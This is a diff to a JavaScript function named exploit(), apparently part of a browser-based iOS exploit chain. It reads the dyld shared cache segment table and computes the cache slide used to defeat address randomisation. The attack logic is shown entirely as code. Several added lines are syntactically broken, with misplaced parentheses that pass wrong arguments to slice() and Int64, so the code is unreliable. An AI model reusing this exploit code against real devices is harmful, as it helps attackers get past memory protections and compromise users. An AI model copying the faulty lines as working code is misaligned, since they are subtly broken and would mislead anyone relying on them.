@@ -558,11 +558,11 @@ function exploit(){
         for(var i = 0; i < dcache_nsegs; i++){
             var off = i * 0x20;
             var seg = {  
-                addr:     new Int64(dcache_segdata.slice(Add(off,new Int64('0x0')), Add(off,new Int64('0x8')))),
-                size:     new Int64(dcache_segdata.slice(Add(off,new Int64('0x8')), Add(off,new Int64('0x10')))),
-                fileoff:  new Int64(dcache_segdata.slice(Add(off,new Int64('0x10')), Add(off,new Int64('0x18')))),
-                maxprot:  b2u32(dcache_segdata.slice(Add(off,new Int64('0x18')), Add(off,new Int64('0x1c')))),
-                initprot: b2u32(dcache_segdata.slice(Add(off,new Int64('0x1c')), Add(off,new Int64('0x20'))))
+                addr:     new Int64(dcache_segdata.slice(off + 0x0,off +0x8)),
+                size:     new Int64(dcache_segdata.slice(Add(off, 0x8)), Add(off,0x10))),
+                fileoff:  new Int64(dcache_segdata.slice(Add(off,0x10)), Add(off,0x18))),
+                maxprot:  b2u32(dcache_segdata.slice(Add(off,0x18)), Add(off,0x1c))),
+                initprot: b2u32(dcache_segdata.slice(Add(off,0x1c)), Add(off,0x20)))
             };
             dcache_segs.push(seg);
         
@@ -608,13 +608,14 @@ function exploit(){
             
             log("DYLD Shared cache segment ("+seg.addr.toString(16)+"-"+Add(seg.addr, seg.size).toString(16)+"): "+init_rights+"/"+max_rights);
             
-            if(seg.fileoff == Int64.Zero || seg.size != Int64.Zero) {
+            if(seg.fileoff == 0  || seg.size != 0) {
             dcache_base_seg = seg;
             //log("dcache base seg@"+dcache_base_seg)
         } else {
         fail("base_seg");
     }
         var cache_slide = Sub(dcache_base, dcache_base_seg.addr);
+        log("cache_slide =" + cache_slide);
         for(var i = 0; i < dcache_segs.length; ++i)
         {
             dcache_segs[i].addr = Add(dcache_segs[i].addr, cache_slide);
